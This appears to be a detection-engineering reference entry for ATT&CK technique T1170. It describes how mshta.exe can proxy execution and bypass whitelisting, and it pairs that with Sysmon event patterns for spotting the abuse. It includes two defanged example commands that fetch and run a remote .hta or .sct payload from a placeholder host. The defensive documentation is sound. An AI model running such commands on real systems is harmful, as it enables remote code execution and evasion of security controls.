# T1170: MSHTA 

Mshta.exe is a utility that executes Microsoft HTML Applications (HTA). HTA files have the file extension .hta. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.

Adversaries can use mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code.

Files may be executed by mshta.exe through an inline script: 
```mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))```

They may also be executed directly from URLs:
```mshta http[:]//webserver/payload[.]hta```

Mshta.exe can be used to bypass application whitelisting solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.

## Detection
```
Event 1
Sysmon Event ID = 1
Windows Security Event ID = 4688
process_parent_path = "*\\mshta.exe" OR process_name = "mshta.exe"

Event 2
Sysmon Event ID = 3
process_parent_path = "*\\mshta.exe" OR process_path = "*\\mshta.exe"

Event 3
Sysmon Event ID = 11 or 15
file_path = "*.hta"
```
